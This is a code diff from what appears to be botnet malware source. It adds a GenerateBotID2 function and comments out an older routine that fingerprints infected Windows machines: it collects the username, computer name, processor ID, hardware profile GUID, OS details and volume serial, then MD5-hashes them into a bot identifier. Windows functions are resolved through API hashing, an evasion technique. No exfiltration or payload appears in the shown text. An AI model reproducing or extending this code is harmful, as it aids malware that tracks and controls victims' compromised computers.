@@ -381,6 +381,23 @@ PCHAR MakeMachineID()
 }
 
 
+//------------------------------------------------------------
+string GenerateBotID2(const char* Prefix)
+{
+	if (STRA::IsEmpty(Prefix))
+		Prefix = GetPrefix();
+
+	string Result;
+
+	PCHAR tmp_BotUid = MakeMachineID();
+
+	Result += Prefix;
+	Result += "0";
+	Result += tmp_BotUid;
+
+	return Result;
+}
+
 
 //------------------------------------------------------------
 void GenerateUid(char *BotUid)
@@ -391,97 +408,100 @@ void GenerateUid(char *BotUid)
 	m_lstrcat( BotUid, "0" );
 	m_lstrcat( BotUid, tmp_BotUid );
 	STR::Free(tmp_BotUid);
-	return;
+
+//	return;
 
 
 	///далее идет старая
-	char *BotId = (char*)MemAlloc( 2048 );
-	
-	DWORD dwUsernameLen = 255;
-	DWORD dwComputerLen = 255;
-	
-	char *User = (char*)MemAlloc( 255 );
-	char *Comp = (char*)MemAlloc( 255 );
-	char *Proc = (char*)MemAlloc( 255 );
-
-	if ( BotId == NULL || User == NULL ||
-		 Comp  == NULL || Proc == NULL )
-	{
-		return;
-	}
-
-	if ( (BOOL)pGetUserNameA( User, &dwUsernameLen ) )
-		m_lstrcat(BotId, User );
-
-	if ( (BOOL)pGetComputerNameA( Comp, &dwComputerLen ) )
-		m_lstrcat( BotId, Comp );
-
-	if ( (DWORD)pGetEnvironmentVariableA( "PROCESSOR_IDENTIFIER", Proc, 255 ) )
-		m_lstrcat( BotId, Proc );
-
-	MemFree(User);
-	MemFree(Comp);
-	MemFree(Proc);
-
-//--------------------------
-
-	HW_PROFILE_INFOA HwProfInfo;
-
-	if ( (BOOL)pGetCurrentHwProfileA( &HwProfInfo ) ) 
-    {
-		m_lstrcat( BotId, HwProfInfo.szHwProfileGuid );
-		m_lstrcat( BotId, HwProfInfo.szHwProfileName );
-    }   
-
-	char *OS = GetOSInfo();
-
-
-	if ( OS != NULL )
-		m_lstrcat( BotId, OS );
-
-	MemFree(OS);
-
-//--------------------------
-
-	DWORD dwSerial = 0;
-
-	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
-	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
-
-	if ( (BOOL)pGetVolumeInformationA( 0, NULL, 0, &dwSerial, 0, 0, NULL, 0 ) )
-		_pwsprintfA(BotId + m_lstrlen(BotId), "%d", dwSerial );
-
-	MD5_CTX ctx;
-
-	MD5Init(&ctx);
-	MD5Update( &ctx, (unsigned char*)BotId, m_lstrlen( BotId ) );
-
-	unsigned char buff[16];	
-
-	MD5Final( buff, &ctx );
-
-	char UidHash[33];
-
-	int p = 0;
-
-	for( int i = 0; i < 16; i++ )
-	{
-		_pwsprintfA( &UidHash[p], "%02X", buff[i] );
-		p += 2;
-	}	
-	
-	UidHash[32] = '\0';
-
-	m_lstrcpy( BotUid, GetPrefix());
-	m_lstrcat( BotUid, "0" );
-	m_lstrcat( BotUid, UidHash );
-
-	BotUid[ m_lstrlen(BotUid) ] = '\0';
-
-    MemFree(BotId);
-
-	return;
+//	char *BotId = (char*)MemAlloc( 2048 );
+//
+//	DWORD dwUsernameLen = 255;
+//	DWORD dwComputerLen = 255;
+//
+//	char *User = (char*)MemAlloc( 255 );
+//	char *Comp = (char*)MemAlloc( 255 );
+//	char *Proc = (char*)MemAlloc( 255 );
+//
+//	if ( BotId == NULL || User == NULL ||
+//		 Comp  == NULL || Proc == NULL )
+//	{
+//		return;
+//	}
+//
+//	if ( (BOOL)pGetUserNameA( User, &dwUsernameLen ) )
+//		m_lstrcat(BotId, User );
+//
+//	if ( (BOOL)pGetComputerNameA( Comp, &dwComputerLen ) )
+//		m_lstrcat( BotId, Comp );
+//
+//	if ( (DWORD)pGetEnvironmentVariableA( "PROCESSOR_IDENTIFIER", Proc, 255 ) )
+//		m_lstrcat( BotId, Proc );
+//
+//	MemFree(User);
+//	MemFree(Comp);
+//	MemFree(Proc);
+//
+////--------------------------
+//
+//	HW_PROFILE_INFOA HwProfInfo;
+//
+//	if ( (BOOL)pGetCurrentHwProfileA( &HwProfInfo ) )
+//    {
+//		m_lstrcat( BotId, HwProfInfo.szHwProfileGuid );
+//		m_lstrcat( BotId, HwProfInfo.szHwProfileName );
+//    }
+//
+//	char *OS = GetOSInfo();
+//
+//
+//	if ( OS != NULL )
+//		m_lstrcat( BotId, OS );
+//
+//	MemFree(OS);
+//
+////--------------------------
+//
+//	DWORD dwSerial = 0;
+//
+//	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
+//	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
+//
+//	if ( (BOOL)pGetVolumeInformationA( 0, NULL, 0, &dwSerial, 0, 0, NULL, 0 ) )
+//		_pwsprintfA(BotId + m_lstrlen(BotId), "%d", dwSerial );
+//
+//	MD5_CTX ctx;
+//
+//	MD5Init(&ctx);
+//	MD5Update( &ctx, (unsigned char*)BotId, m_lstrlen( BotId ) );
+//
+//	unsigned char buff[16];
+//
+//	MD5Final( buff, &ctx );
+//
+//	char UidHash[33];
+//
+//	int p = 0;
+//
+//	for( int i = 0; i < 16; i++ )
+//	{
+//		_pwsprintfA( &UidHash[p], "%02X", buff[i] );
+//		p += 2;
+//	}
+//
+//	UidHash[32] = '\0';
+//
+//	m_lstrcpy( BotUid, Prefix);
+//	m_lstrcat( BotUid, "0" );
+//	m_lstrcat( BotUid, UidHash );
+//
+//	BotUid[ m_lstrlen(BotUid) ] = 0;
+//
+//    MemFree(BotId);
+//
+//	return;
 }
+
+
 
 
 LPVOID GetInfoTable(DWORD dwTableType )
